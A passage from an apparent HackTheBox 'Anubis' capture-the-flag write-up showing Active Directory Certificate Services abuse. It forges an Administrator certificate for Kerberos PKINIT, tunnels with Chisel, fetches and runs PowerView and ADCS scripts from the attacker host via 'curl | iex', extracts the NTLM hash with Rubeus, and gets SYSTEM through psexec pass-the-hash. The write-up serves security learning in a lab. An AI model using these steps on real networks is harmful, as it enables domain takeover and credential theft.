rKG6OJRMPwEWfPiaebk9wxqtHrPAmcFitj5pnr6jyBoZlEarMWpN5boGO6EbFq0P
imLed5q6aVphEQcyiEYm/BtoU7n3MORHivqseLg4FeEVhQnpFRT3NhY3e8/QpcBm
EU5e9e8+LGh3e//zHt0Bbdvpl65a26E02e9PMYbSeCjnTeekO1A/ZfdYJsaXdxJ8
ctfq9e75l+AhwIQXIK9b5l8ALTDbrMXVIf3ukD/8dR+5
-----END CERTIFICATE-----

CertUtil: -ca.cert command completed successfully.

```

#### krb5.conf

I’ll make copies of `ca.cer` (from `certutil` above), `admin.cer` (from `certreq` above), and `admin.key` (generated by the Bash script from Elkement’s post section 09) in one folder (I’m using `/opt/krb5`). I’ll create `/etc/krb5.conf` file based on the [Elkement post](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#12):

```

[libdefaults]
        default_realm = WINDCORP.HTB

[realms]
        WINDCORP.HTB = {
                kdc = EARTH.WINDCORP.HTB
                admin_server = EARTH.WINDCORP.HTB
                pkinit_anchors = FILE:/opt/krb/ca.cer
                pkinit_identities = FILE:/opt/krb/admin.cer,/opt/krb/admin.key
                pkinit_kdc_hostname = EARTH.WINDCORP.HTB
                pkinit_eku_checking = kpServerAuth
        }

[domain_realm]
        .windcorp.htb = WINDCORP.HTB

```

It’s important that the domain stuff is in all caps (Googling some error messages returned posts like [this](https://michlstechblog.info/blog/linux-kerberos-authentification-against-windows-active-directory/) which suggest that).

#### Tunneling

Additionally, since TCP 88 isn’t available on Anubis from my VM, I’ll need to create a Chisel tunnel (either through web pointing at the gateway, or from the DC pointing at localhost). I’ll start the server on my host:

```

oxdf@hacky$ sudo /opt/chisel/chisel_1.7.6_linux_amd64 server -p 8000 --reverse
2022/01/26 16:54:17 server: Reverse tunnelling enabled
2022/01/26 16:54:17 server: Fingerprint 8vSKQaMA/qkICC0NBvVU2QonOER+qo/fnsVKlNLuHek=
2022/01/26 16:54:17 server: Listening on http://0.0.0.0:8000

```

Now I’ll upload and run Chisel from the DC:

```

PS C:\programdata> .\chisel.exe client 10.10.14.6:8000 R:socks

```

At the server there’s a connection:

```

2022/01/26 16:55:14 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

From the perspective of a packet coming out of the tunnel, earth.windcorp.htb is now 127.0.0.1, so I’ll update `/etc/hosts` to reflect this:

```
127.0.0.1 earth.windcorp.htb WINDCORP.HTB

```

#### Test kinit

Once I get it set up right, I should be able to authenticate as a user. For example, I have creds for localadmin, so I’ll try that:

```

oxdf@hacky$ proxychains kinit localadmin@WINDCORP.HTB
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
Password for localadmin@WINDCORP.HTB: 
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: localadmin@WINDCORP.HTB

Valid starting       Expires              Service principal
01/25/2022 22:21:31  01/26/2022 08:21:31  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 01/26/2022 22:21:27

```

It worked! `klist` shows I have a token for localadmin.

### Shell as Administrator

#### Get Administrator Token - Fail

`kdestroy` will clear all the tokens out of my store so I can start fresh.

I’ll do the same thing, but this time, with extra parameters to indicate I’m using the certificate:

```

oxdf@hacky$ proxychains kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
ProxyChains-3.1 (http://proxychains.sf.net)
Using default cache: /tmp/krb5cc_1000
Using principal: administrator@WINDCORP.HTB
PA Option X509_user_identity = FILE:admin.cer,admin.key
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
Password for administrator@WINDCORP.HTB:

```

Unfortunately, it’s asking for a password, which means the certificate has failed. I’ll re-run that same command with `KRB5_TRACE=/dev/stdout` to print out all the status messages:

```

oxdf@hacky$ KRB5_TRACE=/dev/stdout proxychains kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
ProxyChains-3.1 (http://proxychains.sf.net)
Using default cache: /tmp/krb5cc_1000
Using principal: administrator@WINDCORP.HTB
PA Option X509_user_identity = FILE:admin.cer,admin.key
[50169] 1643232928.185856: Getting initial credentials for administrator@WINDCORP.HTB
[50169] 1643232928.185858: Sending unauthenticated request
[50169] 1643232928.185859: Sending request (193 bytes) to WINDCORP.HTB
[50169] 1643232928.185860: Resolving hostname EARTH.WINDCORP.HTB
[50169] 1643232928.185861: Sending initial UDP request to dgram 127.0.0.1:88
[50169] 1643232928.185862: Initiating TCP connection to stream 127.0.0.1:88
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
[50169] 1643232928.185863: Sending TCP request to stream 127.0.0.1:88
[50169] 1643232928.185864: Received answer (193 bytes) from stream 127.0.0.1:88
[50169] 1643232928.185865: Terminating TCP connection to stream 127.0.0.1:88
[50169] 1643232928.185866: Sending DNS URI query for _kerberos.WINDCORP.HTB.
[50169] 1643232928.185867: No URI records found
[50169] 1643232928.185868: Sending DNS SRV query for _kerberos-master._udp.WINDCORP.HTB.
[50169] 1643232928.185869: Sending DNS SRV query for _kerberos-master._tcp.WINDCORP.HTB.
[50169] 1643232928.185870: No SRV records found
[50169] 1643232928.185871: Response was not from master KDC
[50169] 1643232928.185872: Received error from KDC: -1765328359/Additional pre-authentication required
[50169] 1643232928.185875: Preauthenticating using KDC method data
[50169] 1643232928.185876: Processing preauth types: PA-PK-AS-REQ (16), PA-PK-AS-REP_OLD (15), PA-ETYPE-INFO2 (19), PA-ENC-TIMESTAMP (2)
[50169] 1643232928.185877: Selected etype info: etype aes256-cts, salt "WINDCORP.HTBAdministrator", params ""
[50169] 1643232928.185878: PKINIT loading CA certs and CRLs from FILE
[50169] 1643232928.185879: PKINIT client computed kdc-req-body checksum 9/16A66644A8DAAA81786F76B4AB0B82D719F135BF
[50169] 1643232928.185881: PKINIT client making DH request
[50169] 1643232929.173372: PKINIT OpenSSL error: Failed to verify own certificate (depth 0): certificate is not yet valid
[50169] 1643232929.173373: Preauth module pkinit (16) (real) returned: -1765328360/Failed to verify own certificate (depth 0): certificate is not yet valid
[50169] 1643232929.173374: PKINIT client ignoring draft 9 offer from RFC 4556 KDC
[50169] 1643232929.173375: Preauth module pkinit (15) (real) returned: -1765328360/Preauthentication failed
Password for administrator@WINDCORP.HTB:

```

There’s a lot there, but after a lot of troubleshooting, I noticed this line:

> Failed to verify own certificate (depth 0): certificate is not yet valid

#### Fix Time - Manually

That sounds like a time issue. I’ll remember back at the start of the box noting that `nmap` identified a one hour time difference. VirtualBox tries really hard to keep the clock in the VM in sync with the host. I had already run `sudo service virtualbox-guest-utils stop` on my host. I had to also `sudo service vboxadd-service stop` within my VM to get it to not update the time right back. additionally, when the clock changes, the VPN will typically disconnect. So to get the time changed, I’ll run:
- `sudo service vboxadd-service stop`
- `sudo date -s 17:39` (one hour later than currently)
- Reconnect my VPN and make sure shells / tunnels are still up

Now on running the same command, it reports success:

```

oxdf@hacky$ proxychains kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
ProxyChains-3.1 (http://proxychains.sf.net)
Using default cache: /tmp/krb5cc_1000
Using principal: administrator@WINDCORP.HTB
PA Option X509_user_identity = FILE:admin.cer,admin.key
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
Authenticated to Kerberos v5

```

Now `klist` shows I have a token for `administrator@WINDCORP.HTB`:

```

oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@WINDCORP.HTB

Valid starting       Expires              Service principal
01/26/2022 17:39:45  01/27/2022 03:39:45  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 01/27/2022 17:39:31

```

#### Fix Time - faketime

I learned about `faketime` solving Anubis. It’s a [neat little utility](http://manpages.ubuntu.com/manpages/trusty/man1/faketime.1.html) that hooks the calls to get the system time and returns something different as directed. So I can use that here without changing my system clock.

```

oxdf@hacky$ proxychains faketime -f +1h kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB                                                                               
ProxyChains-3.1 (http://proxychains.sf.net)
Using default cache: /tmp/krb5cc_1000
Using principal: administrator@WINDCORP.HTB         
PA Option X509_user_identity = FILE:admin.cer,admin.key                                       
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK       
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK                                                    
Authenticated to Kerberos v5

```

It is important that `proxychains` comes before `faketime` it seems.

#### EVil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) has a `-r` option:

> ```

> -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
>
> ```

I’ll use that, along with the host to connect to (`-i`), and using `proxychains` as it will need to connect to both 5985 and 88 which aren’t available to me without a tunnel:

```

oxdf@hacky$ proxychains evil-winrm -i earth.windcorp.htb -r windcorp.htb
ProxyChains-3.1 (http://proxychains.sf.net)

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5985-<><>-OK
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

If I used `faketime` to get the token, I’ll need to use it here as well:

```

oxdf@hacky$ proxychains evil-winrm -i earth.windcorp.htb -r windcorp.htb
ProxyChains-3.1 (http://proxychains.sf.net)

Evil-WinRM shell v3.3 

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information                             
Clock skew too great

Error: Exiting with code 1  
oxdf@hacky$ proxychains faketime -f +1h evil-winrm -i earth.windcorp.htb -r windcorp.htb                                                                                                                 
ProxyChains-3.1 (http://proxychains.sf.net)         
                                                    
Evil-WinRM shell v3.3      

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5985-<><>-OK
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

From here I can grab `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
313fec7a************************

```

## Root Step with Alternative Tools

### Overview

All the same steps can be done much faster with [PoshADCS](https://github.com/cfalta/PoshADCS), a PowerShell script designed to automate attack paths through ADCS, and [Rubeus](https://github.com/GhostPack/Rubeus), a tool for abusing Kerberos. To get a compiled `Rubeus.exe`, I’ll use [Sharp Collection](https://github.com/Flangvik/SharpCollection), a project that compiles a bunch of C# offensive tools and makes them available. One note - I originally tried the `NetFramework_4.5_x64` version, and it didn’t work. It turns out that version isn’t up to date for some reason:

![image-20220126065534274](https://0xdfimages.gitlab.io/img/image-20220126065534274.png)

The version from `NetFramework_4.5_x64_any` is:

![image-20220126065609890](https://0xdfimages.gitlab.io/img/image-20220126065609890.png)

There is one other bug in `ACDS.ps1` that will break because of a misconfiguration specific to Anubis, and that is that the the UserPrincipleName on the Administrator account is messed up, set to an old domain that the box was developed on before it was changed to submit to HackTheBox. In effect, this means at [this line](https://github.com/cfalta/PoshADCS/blob/b9c3906dc02be706cc547f33510146f971d5ff10/ADCS.ps1#L929), it will fail:

![image-20220129111308324](https://0xdfimages.gitlab.io/img/image-20220129111308324.png)

However, that `$TargetUPN` isn’t used for much, so just by editing it to be `$user.SamAccountName`, the rest will work fine.

### Prep

I’ll upload `Rubeus.exe` and load (my slightly modified) `ADCS.ps1` as well as [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) (`ADCS.ps1` requires it):

```

PS C:\programdata> curl http://10.10.14.6/Rubeus.exe -outfile \programdata\rubeus.exe
PS C:\programdata> curl http://10.10.14.6/PowerView.ps1 | iex
PS C:\programdata> curl http://10.10.14.6/ADCS.ps1 | iex

<#
.SYNOPSIS

Just a shortcut to PowerViews Get-DomainObject that retrieves Root CAs from the default location at CN=Certification 
Authorities,CN=Public Key Services,CN=Services,CN=Configuration....

Author: Christoph Falta (@cfalta)

.LINK

https://github.com/cfalta/PoshADCS

#>
    $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
    $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
    $RootCA =  Get-DomainObject -SearchBase ("CN=Certification Authorities," + $BasePath) -LDAPFilter 
"(objectclass=certificationAuthority)"
    $RootCA

```

### Generate Certificate

I’ll use `Get-SmartCardCertificat` to generate the certificate request and get it approved by the CA (this replaces the entire [Generate Administrator Certificate](#generate-administrator-certificate) section above):

```

PS C:\programdata> Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose

```

I’m giving it the user I want it for and the template, and making sure it knows there’s no physical smart card present.

Once that completes, I’ll find the certificate in the current user’s store:

```

PS C:\programdata> gci cert:\currentuser\my -recurse

   PSParentPath: Microsoft.PowerShell.Security\Certificate::currentuser\my

Thumbprint                                Subject                                                                      
----------                                -------                                                                      
1C7115A30632E82A04A734179759756427247965

```

### Get NTLM with Rubeus

`Rubeus.exe` can use that certificate now to get a TGT, and with the `/getcredentials` flag, the NTLM hash as well:

```

PS C:\programdata> .\rubeus.exe asktgt /user:Administrator /getcredentials /certificate:1C7115A30632E82A04A734179759756427247965

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject:  
[*] Building AS-REQ (w/ PKINIT preauth) for: 'windcorp.htb\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE5DCCBOBhggTcMIIE2KADAgEFoQ4bDFdJTkRDT1JQLkhUQqIhMB+g
AwIBAqEYMBYbBmtyYnRndBsMd2luZGNvcnAuaHRio4IEnDCCBJigAwIBEqEDAgECooIEigSCBIY03k41
..
MDI0NFqoDhsMV0lORENPUlAuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0Gwx3aW5kY29ycC5odGI=

  ServiceName              :  krbtgt/windcorp.htb
  ServiceRealm             :  WINDCORP.HTB
  UserName                 :  Administrator
  UserRealm                :  WINDCORP.HTB
  StartTime                :  1/26/2022 2:02:44 PM
  EndTime                  :  1/27/2022 12:02:44 AM
  RenewTill                :  2/2/2022 2:02:44 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  eFQWOai0Ha57hYJqqDcGUA==
  ASREP (key)              :  B98F843C14877A1B3AF0F77C3A82999E

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3CCC18280610C6CA3156F995B5899E09

```

### System Shell

With that NTLM, I can use `psexec.py` to get a shell as SYSTEM:

```

oxdf@hacky$ psexec.py -hashes 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09 administrator@10.10.11.102 cmd.exe
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.11.102.....
[*] Found writable share ADMIN$
[*] Uploading file mFKkimdH.exe
[*] Opening SVCManager on 10.10.11.102.....
[*] Creating service LZCC on 10.10.11.102.....
[*] Starting service LZCC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```